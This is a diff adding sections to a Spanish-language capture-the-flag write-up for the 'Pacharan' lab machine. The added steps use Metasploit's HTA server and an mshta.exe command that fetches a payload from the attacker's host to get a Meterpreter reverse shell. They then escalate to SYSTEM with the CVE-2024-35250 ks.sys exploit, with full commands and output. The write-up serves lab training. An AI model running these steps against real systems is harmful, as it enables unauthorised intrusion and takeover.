@@ -21,9 +21,13 @@ tags:
   - SMB Enumeration
   - RPC Enumeration
   - Local Privilege Escalation (LPE)
+  - System Recognition (Windows)
   - Abusing SeLoadDriverPrivilege Privilege
+  - CVE-2024-35250 (LPE)
   - Privesc - Abusing SeLoadDriverPrivilege Privilege
+  - Privesc - CVE-2024-35250 (LPE)
   - OSCP Style
+  - Metasploit Framework
 ---
 ![](/assets/images/THL-writeup-pacharan/pacharan.jpg)
 
@@ -42,6 +46,11 @@ Herramientas utilizadas:
 * *rlwrap*
 * *nc*
 * *msfvenom*
+* *Metasploit Framework (msfconsole)*
+* *Meterpreter*
+* *Módulo: exploit/windows/misc/hta_server*
+* *Módulo: post/multi/recon/local_exploit_suggester*
+* *Módulo: exploit/windows/local/cve_2024_35250_ks_driver*
 
 
 <br>
@@ -68,6 +77,11 @@ Herramientas utilizadas:
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
 				<li><a href="#Privesc">Abusando del Privilegio SeLoadDriverPrivilege para Escalar Privilegios</a></li>
+				<li><a href="#EnumWin">Enumeración de Máquina Windows con Módulo de local_exploit_suggester de Metasploit y Escalando Privilegios con cve_2024_35250_ks_driver</a></li>
+				<ul>
+					<li><a href="#HTA">Levantando Servidor HTA y Obteniendo Sesión de Meterpreter</a></li>
+					<li><a href="#Suggester">Utilizando Módulo local_exploit_suggester y Probando Exploit cve_2024_35250_ks_driver</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -751,6 +765,21 @@ Mode                LastWriteTime         Length Name
 
 <h2 id="Privesc">Abusando del Privilegio SeLoadDriverPrivilege para Escalar Privilegios</h2>
 
+Si revisamos nuestros privilegios, veremos uno interesante:
+```batch
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents> whoami /priv
+.
+INFORMACIàN DE PRIVILEGIOS
+--------------------------
+
+Nombre de privilegio          Descripci¢n                                     Estado
+============================= =============================================== ==========
+SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio        Habilitada
+SeLoadDriverPrivilege         Cargar y descargar controladores de dispositivo Habilitada
+SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido                Habilitada
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso    Habilitada
+```
+
 Investigando un poco, existe la posibilidad de utilizar el **privilegio SeLoadDriverPrivilege** para escalar privilegios. En el siguiente blog se explica bastante bien el cómo se hace esto:
 * <a href="https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/" target="_blank">Abusando SeLoadDriverPrivilege para elevar privilegios</a>
 
@@ -863,6 +892,141 @@ type root.txt
 ...
 ```
 Con esto completamos la máquina.
+
+<br>
+
+<h2 id="EnumWin">Enumeración de Máquina Windows con Módulo de local_exploit_suggester de Metasploit y Escalando Privilegios con cve_2024_35250_ks_driver</h2>
+
+Si nosotros quisiéramos utilizar el módulo `post/multi/recon/local_exploit_suggester` de **Metasploit**, necesitaríamos una sesión de **Meterpreter**.
+
+Para obtener esta sesión, necesitamos usar el módulo **HTA Server** que nos dará una URL que usaremos dentro de la sesión de **evil-winrm** junto al comando **mshta.exe**, pues este permite la ejecución de aplicaciones **HTA**.
+
+<br>
+
+<h3 id="HTA">Levantando Servidor HTA y Obteniendo Sesión de Meterpreter</h3>
+
+Inicia **Metasploit** y usa el módulo **HTA Server**:
+```bash
+msfconsole -q
+msf6 > use exploit/windows/misc/hta_server
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/misc/hta_server) >
+```
+
+Vamos a configurarlo para que acepte la **arquitectura x64 de Windows** y le configuramos nuestra IP:
+```bash
+msf6 exploit(windows/misc/hta_server) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/misc/hta_server) > set target 1
+target => 1
+msf6 exploit(windows/local/bypassuac_comhijack) > set LHOST Tu_IP
+LHOST => Tu_IP
+```
+
+Lo ejecutamos y copiamos la URL:
+```bash
+msf6 exploit(windows/misc/hta_server) > exploit
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on Tu_IP:4444 
+[*] Using URL: http://Tu_IP:8080/nkP4w3.hta
+[*] Server started.
+```
+
+Ahora, en la sesión de **evil-winrm**, usamos el comando **mshta.exe** y le agregamos la URL:
+```bash
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents> mshta.exe http://Tu_IP:8080/nkP4w3.hta
+```
+
+Si revisas **Metasploit**, verás que ya tienes una sesión de **Meterpreter**:
+```bash
+msf6 exploit(windows/misc/hta_server) > 
+[*] 192.168.69.69    hta_server - Delivering Payload
+[*] Sending stage (203846 bytes) to 192.168.69.69
+[*] Meterpreter session 1 opened (Tu_IP:4444 -> 192.168.69.69:49776) at 2025-02-25 02:13:55 -0600
+
+msf6 exploit(windows/misc/hta_server) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                              Connection
+  --  ----  ----                     -----------                              ----------
+  1         meterpreter x64/windows  PACHARAN\Chivas Regal @ WIN-VRU3GG3DPLJ  Tu_IP:4444 -> 192.168.69.69:49776 (192.168.69.69)
+```
+
+<br>
+
+<h3 id="Suggester">Utilizando Módulo local_exploit_suggester y Probando Exploit cve_2024_35250_ks_driver</h3>
+
+Vamos a usar el módulo `post/multi/recon/local_exploit_suggester` para obtener una lista de Exploits que nos puedan ayudar a escalar privilegios:
+```bash
+msf6 exploit(windows/misc/hta_server) > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
+msf6 post(multi/recon/local_exploit_suggester) > exploit
+[*] 192.168.69.69 - Collecting local exploits for x64/windows...
+[*] 192.168.69.69 - 203 exploit checks are being tried...
+...
+...
+...
+#   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1607 build detected!
+ 8   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
+ 10  exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1607 build detected!
+ 11  exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
+ 12  exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2016
+ 13  exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2016
+ 14  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+ 15  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
+```
+Salieron varios Exploits, pero el que nos va a servir será `exploit/windows/local/cve_2024_35250_ks_driver`.
+
+Este Exploit se aprovecha del driver ks.sys que es un componente del **Kernel Streaming (KS)** y se encuentra instalado por defecto en **Windows 10**. Este Exploit pertenece al **CVE-2024-35250**.
+
+Vamos a usarlo:
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2024_35250_ks_driver
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/cve_2024_35250_ks_driver) >
+```
+
+Lo configuramos:
+```bash
+msf6 exploit(windows/local/cve_2024_35250_ks_driver) > set LPORT 5555
+LPORT => 5555
+msf6 exploit(windows/local/cve_2024_35250_ks_driver) > set SESSION 1
+SESSION => 1
+msf6 exploit(windows/local/cve_2024_35250_ks_driver) > set LHOST Tu_IP
+LHOST => Tu_IP
+```
+
+Y lo ejecutamos:
+```bash
+msf6 exploit(windows/local/cve_2024_35250_ks_driver) > exploit
+[*] Started reverse TCP handler on Tu_IP:5555 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2016
+[*] Launching notepad to host the exploit...
+[*] The notepad path is: C:\Windows\System32\notepad.exe
+[*] The notepad pid is: 732
+[*] Reflectively injecting the DLL into 732...
+[*] Sending stage (203846 bytes) to 192.168.69.69
+[*] Meterpreter session 4 opened (Tu_IP:5555 -> 192.168.69.69:49820) at 2025-02-25 02:27:20 -0600
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+Listo, volvimos a escalar privilegios.
 
 
 <br>
